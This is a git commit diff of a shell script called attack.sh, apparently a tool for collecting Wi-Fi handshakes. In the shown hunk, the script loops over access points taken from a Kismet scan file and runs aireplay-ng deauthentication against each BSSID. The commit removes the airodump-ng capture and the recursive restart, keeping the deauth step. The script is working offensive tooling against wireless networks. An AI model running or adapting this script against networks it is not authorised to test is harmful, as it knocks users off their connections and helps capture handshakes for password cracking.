434d21f59d507c8417a4e18f3fcbe3192429ba49
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-27 22:10:42 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -117,17 +117,13 @@ active() {
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           iwconfig $interface channel $Channel
           aireplay-ng -a $BSSID -0 10 $interface &
-          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
-          airodumpPID=`echo $!`
-          sleep 30
-          echo "airodumpPID:"$airodumpPID
-          kill -9 $airodumpPID
+          
           checkHandshakes
           rm /home/kali/hscollector/shakes-01.* >/dev/null
           
   done < /home/kali/hscollector/shakesCollector-01.kismet.csv
   rm /home/kali/hscollector/shakes* &>/dev/null
-  active
+  
 }
 
 attackSpecific(){
